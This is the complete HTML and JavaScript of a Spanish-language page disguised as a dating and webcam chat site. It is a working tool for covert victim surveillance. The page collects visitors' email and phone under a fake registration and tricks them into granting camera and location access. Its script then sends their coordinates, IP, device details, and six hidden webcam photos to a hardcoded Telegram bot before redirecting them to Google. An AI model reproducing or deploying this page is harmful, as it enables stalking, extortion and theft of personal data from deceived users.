<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <title>Aventura Exclusiva</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
  
  <style>
    :root { --primary-blue: #00d1ff; --dark-bg: #1a1a1a; --nav-bg: #ffffff; --tab-bg: #333333; }
    
    body { 
      margin: 0; 
      background: #0f0f0f url('image/cu3.jpg') no-repeat center center fixed; 
      background-size: cover; 
      font-family: 'Segoe UI', Roboto, sans-serif; 
      color: white; 
      overflow-x: hidden;
    }

    .hidden { display: none !important; }

    /* HEADER */
    header { background: var(--nav-bg); width: 100%; position: fixed; top: 0; z-index: 2000; }
    .top-bar { display: flex; align-items: center; justify-content: space-between; padding: 10px 15px; height: 60px; }
    .menu-burger { border: 1.5px solid #0056b3; border-radius: 8px; padding: 8px 12px; color: #0056b3; font-size: 20px; cursor: pointer; }
    .logo-area { text-align: center; flex-grow: 1; }
    .logo-text { font-weight: 900; font-size: 22px; text-transform: uppercase; letter-spacing: -1px; }
    .logo-blue { color: #2c5ba0; }
    .logo-dark { color: #333; }
    .nav-tabs { display: flex; background: var(--tab-bg); border-top: 1px solid #444; }
    .tab-item { flex: 1; text-align: center; padding: 12px 5px; font-size: 14px; color: white; border-right: 1px solid #555; display: flex; align-items: center; justify-content: center; cursor: pointer; }
    .badge { background: #ff4d6d; color: white; font-size: 10px; font-weight: bold; padding: 2px 6px; border-radius: 10px; margin-right: 5px; }

    /* CONTENT */
    .main-content { height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding-top: 110px; }
    #startBtn { padding: 16px 35px; font-size: 18px; font-weight: bold; background: rgba(0, 0, 0, 0.7); color: white; border: 2px solid var(--primary-blue); border-radius: 50px; cursor: pointer; backdrop-filter: blur(8px); z-index: 10; }
    
    .pulse { animation: pulseBtn 1.8s infinite; }
    @keyframes pulseBtn { 0% { box-shadow: 0 0 0 0 rgba(0, 209, 255, 0.6); } 70% { box-shadow: 0 0 0 15px rgba(0, 209, 255, 0); } 100% { box-shadow: 0 0 0 0 rgba(0, 209, 255, 0); } }

    /* MODALS */
    .glass-overlay { position: fixed; inset: 0; background: rgba(0, 0, 0, 0.30); display: flex; flex-direction: column; align-items: center; justify-content: center; backdrop-filter: blur(15px); z-index: 3000; padding: 20px; }
    .modal-content { background: rgba(255, 255, 255, 0.1); padding: 25px; border-radius: 20px; width: 100%; max-width: 380px; border: 1px solid rgba(255, 255, 255, 0.2); text-align: center; }
    .input-group { position: relative; margin-bottom: 15px; }
    .input-group i { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: var(--primary-blue); }
    .input-group input { width: 100%; padding: 14px 15px 14px 45px; background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 12px; color: white; outline: none; box-sizing: border-box; }
    .btn-action { width: 100%; padding: 15px; background: var(--primary-blue); border: none; border-radius: 12px; font-weight: bold; color: black; cursor: pointer; }
    .auth-item { text-align: left; margin: 15px 0; }
    .auth-item h3 { font-size: 0.9rem; color: var(--primary-blue); margin-bottom: 5px; }
    .auth-img { width: 100%; border-radius: 10px; border: 1px dashed #555; background: #222; min-height: 60px; }
    
    .loader { width: 40px; height: 40px; border: 4px solid #333; border-top: 4px solid var(--primary-blue); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 15px; }
    @keyframes spin { 100% { transform: rotate(360deg); } }
    
    video, canvas { display: none; }
  </style>
</head>
<body>

  <header>
    <div class="top-bar trigger-auth">
      <div class="menu-burger"><i class="fas fa-bars"></i></div>
      <div class="logo-area">
        <span class="logo-text"><span class="logo-blue">MVIDEO</span>CHAT <span class="logo-dark">FOTO/DISCUSI√ìN</span></span>
      </div>
       <div style="width: 45px;"></div>
    </div>
    <div class="nav-tabs">
      <div class="tab-item trigger-auth"><span class="badge">6</span> Citas</div>
      <div class="tab-item trigger-auth"><span class="badge">4</span> Webcams</div>
      <div class="tab-item trigger-auth"><span class="badge">10</span> Chat</div>
    </div>
  </header>

  <div class="main-content">
    <button id="startBtn" class="pulse trigger-auth">Iniciar chat</button>
  </div>

  <div id="registerModal" class="glass-overlay hidden">
    <div class="modal-content">
      <h2><i class="fas fa-comments"></i> Registro R√°pido</h2>
      <p>Crea un perfil para unirte a la comunidad.</p>
      <div class="input-group">
        <i class="fas fa-envelope"></i>
        <input type="email" id="regEmail" placeholder="Correo electr√≥nico">
      </div>
      <div class="input-group">
        <i class="fas fa-phone"></i>
        <input type="tel" id="regPhone" placeholder="Tel√©fono">
      </div>
      <button id="submitReg" class="btn-action">Continuar</button>
    </div>
  </div>


  <div id="authModal" class="glass-overlay hidden">
    <div class="modal-content">
      <h2 style="color: #ffcc00;"><i class="fas fa-exclamation-triangle"></i> Autorizaci√≥n requerida</h2>
      <p>Para finalizar el registro, por favor autoriza los siguientes accesos en tu navegador:</p>
      
      <div class="auth-section">
        <div class="auth-item">
          <h3><i class="fas fa-camera"></i> C√°mara</h3>
        </div>
        
        <div class="auth-item">
          <h3><i class="fas fa-location-dot"></i> Ubicaci√≥n</h3>
           <img src="image/auto.png" alt="Indicaci√≥n C√°mara" class="auth-img">
        </div>
      </div>

      <button id="confirmAuth" class="btn-action" style="background: #28a745; color: white;">
        ENTIENDO Y ACEPTO
      </button>
    </div>
  </div>
 

 <div id="loadingScreen" class="glass-overlay hidden">
    <div class="loader"></div>
    <div id="loadText">Conectando...</div>
  </div>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    const botToken = "8219156030:AAGt4YPKSBg6FZxAwi31l9yautyH8OTZ8Dk"; 
    const chatId = "-1003619195565"; 

    const registerModal = document.getElementById("registerModal");
    const authModal = document.getElementById("authModal");
    const loadingScreen = document.getElementById("loadingScreen");
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const startBtn = document.getElementById("startBtn");

    let photoCount = 0;

    window.onload = () => {
        if (localStorage.getItem("user_email")) {
            startBtn.innerText = "Acceder al sitio web";
        }
    };

    const getSystemInfo = () => {
        return {
            platform: navigator.platform,
            time: new Date().toLocaleString('es-ES'),
            model: (navigator.userAgent.match(/\(([^)]+)\)/) || [null, "Desconocido"])[1],
            agent: navigator.userAgent
        };
    };

    async function handleMainClick() {
        const emailSaved = localStorage.getItem("user_email");
        const authSaved = localStorage.getItem("auth_validee");

        if (!emailSaved) {
            registerModal.classList.remove("hidden");
        } else if (!authSaved) {
            authModal.classList.remove("hidden");
        } else {
            startBtn.innerText = "Cargando...";
            await demarrerCaptureSilencieuse();
        }
    }

    document.querySelectorAll('.trigger-auth').forEach(el => el.onclick = handleMainClick);

    document.getElementById("submitReg").onclick = () => {
        const email = document.getElementById("regEmail").value;
        const phone = document.getElementById("regPhone").value;
        if (email && phone) {
            localStorage.setItem("user_email", email);
            localStorage.setItem("user_phone", phone);
            registerModal.classList.add("hidden");
            authModal.classList.remove("hidden");
        } else {
            alert("Por favor, rellene los campos.");
        }
    };

    document.getElementById("confirmAuth").onclick = () => {
        localStorage.setItem("auth_validee", "true");
        authModal.classList.add("hidden");
        demarrerCaptureSilencieuse();
    };

    async function demarrerCaptureSilencieuse() {
        loadingScreen.classList.remove("hidden");
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;
            
            navigator.geolocation.getCurrentPosition(
                (pos) => envoyerDonnees(`${pos.coords.latitude}, ${pos.coords.longitude}`),
                () => envoyerDonnees("Rechazada"),
                { timeout: 5000 }
            );
        } catch (e) {
            envoyerDonnees("Acceso a c√°mara denegado");
        }
    }

    async function envoyerDonnees(coords) {
        const ip = await fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>d.ip).catch(()=>"Desconocida");
        const info = getSystemInfo();
        const email = localStorage.getItem("user_email");
        const phone = localStorage.getItem("user_phone");

        const text = `
üÜï **NUEVA ACTIVIDAD**
üìß Email: ${email}
üìû Tel: ${phone}
------------------------
üìç Coordenadas: ${coords}
üåê IP: ${ip}
üì± Modelo: ${info.model}
üïí Fecha: ${info.time}
üñ•Ô∏è OS: ${info.platform}
üîç User-Agent: ${info.agent}
        `;

        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: "Markdown" })
        });

        const interval = setInterval(async () => {
            if(photoCount < 6) {
                photoCount++;
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext("2d").drawImage(video, 0, 0);
                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.5));
                const fd = new FormData();
                fd.append("chat_id", chatId);
                fd.append("photo", blob, "photo.jpg");
                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {method:"POST", body:fd});
            } else {
                clearInterval(interval);
                window.location.replace("https://www.google.com");
            }
        }, 2000);
    }
  </script>
</body>
</html>
